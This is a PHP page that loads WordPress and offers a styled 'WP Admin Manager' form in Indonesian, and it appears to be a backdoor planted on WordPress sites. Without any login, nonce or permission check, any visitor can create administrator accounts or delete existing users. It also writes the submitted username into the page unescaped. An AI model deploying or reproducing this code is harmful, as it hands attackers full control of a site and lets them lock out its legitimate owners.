<?php
require_once("wp-load.php");
$message = "";
$status = ""; // Untuk menentukan warna alert (success/error)

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? 'create';

    if ($action === 'create') {
        $username = trim($_POST['username'] ?? '');
        $password = trim($_POST['password'] ?? '');
        $email    = trim($_POST['email'] ?? '');

        if (!$username || !$password || !$email) {
            $message = "Semua field harus diisi!";
            $status = "error";
        } elseif (username_exists($username) || email_exists($email)) {
            $message = "Username atau email sudah digunakan!";
            $status = "error";
        } else {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                $message = "User <strong>$username</strong> berhasil dibuat! <a href='wp-login.php' class='underline font-bold'>Login Sekarang</a>";
                $status = "success";
            } else {
                $message = "Gagal: " . $user_id->get_error_message();
                $status = "error";
            }
        }
    }

    if ($action === 'delete') {
        $target_user = trim($_POST['delete_username'] ?? '');
        if ($target_user && username_exists($target_user)) {
            $user_id = username_exists($target_user);
            require_once ABSPATH.'wp-admin/includes/user.php';
            wp_delete_user($user_id);
            $message = "User <strong>$target_user</strong> berhasil dihapus!";
            $status = "success";
        } else {
            $message = "User tidak ditemukan.";
            $status = "error";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP Admin Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #0f172a; }
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 text-slate-200">

    <div class="w-full max-w-4xl">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-extrabold text-white tracking-tight">WP Admin Manager</h1>
            <p class="text-slate-400 mt-2">Kelola akses administrator dengan cepat</p>
        </div>

        <?php if ($message): ?>
            <div class="mb-6 p-4 rounded-xl flex items-center shadow-lg <?php echo $status === 'success' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/50' : 'bg-rose-500/20 text-rose-400 border border-rose-500/50'; ?>">
                <span class="mr-3 text-xl"><?php echo $status === 'success' ? '✅' : '❌'; ?></span>
                <span><?php echo $message; ?></span>
            </div>
        <?php endif; ?>

        <div class="grid md:grid-cols-2 gap-8">
            <div class="glass p-8 rounded-2xl shadow-2xl transition hover:border-emerald-500/30">
                <div class="flex items-center mb-6">
                    <div class="p-3 bg-emerald-500/20 rounded-lg mr-4">
                        <svg class="w-6 h-6 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path></svg>
                    </div>
                    <h2 class="text-xl font-semibold">Tambah Admin</h2>
                </div>
                
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="action" value="create">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Username</label>
                        <input type="text" name="username" class="w-full bg-slate-900/50 border border-slate-700 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-emerald-500 outline-none transition" placeholder="Contoh: admin_baru" required>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Email</label>
                        <input type="email" name="email" class="w-full bg-slate-900/50 border border-slate-700 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-emerald-500 outline-none transition" placeholder="email@website.com" required>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Password</label>
                        <input type="text" name="password" class="w-full bg-slate-900/50 border border-slate-700 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-emerald-500 outline-none transition" placeholder="Password kuat" required>
                    </div>
                    <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 rounded-lg shadow-lg shadow-emerald-900/20 transition-all active:scale-95 mt-4">
                        Buat User Admin
                    </button>
                </form>
            </div>

            <div class="glass p-8 rounded-2xl shadow-2xl transition hover:border-rose-500/30">
                <div class="flex items-center mb-6">
                    <div class="p-3 bg-rose-500/20 rounded-lg mr-4">
                        <svg class="w-6 h-6 text-rose-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7a4 4 0 11-8 0 4 4 0 018 0zM9 14a6 6 0 00-6 6v1h12v-1a6 6 0 00-6-6zM21 12h-6"></path></svg>
                    </div>
                    <h2 class="text-xl font-semibold text-white">Hapus Admin</h2>
                </div>

                <form method="POST" class="space-y-4">
                    <input type="hidden" name="action" value="delete">
                    <div>
                        <label class="block text-sm font-medium text-slate-400 mb-1">Username Target</label>
                        <input type="text" name="delete_username" class="w-full bg-slate-900/50 border border-slate-700 rounded-lg px-4 py-2.5 focus:ring-2 focus:ring-rose-500 outline-none transition" placeholder="Username yang dihapus" required>
                    </div>
                    <div class="bg-rose-500/10 p-4 rounded-lg mb-4 mt-6">
                        <p class="text-xs text-rose-300"><strong>Peringatan:</strong> Menghapus user bersifat permanen. Pastikan username yang Anda masukkan sudah benar.</p>
                    </div>
                    <button type="submit" class="w-full bg-rose-600 hover:bg-rose-500 text-white font-bold py-3 rounded-lg shadow-lg shadow-rose-900/20 transition-all active:scale-95">
                        Hapus User Sekarang
                    </button>
                </form>
            </div>
        </div>
        
        <footer class="mt-12 text-center text-slate-500 text-sm">
            &copy; <?php echo date('Y'); ?> &bull; WordPress Administration Tool
        </footer>
    </div>

</body>
</html>
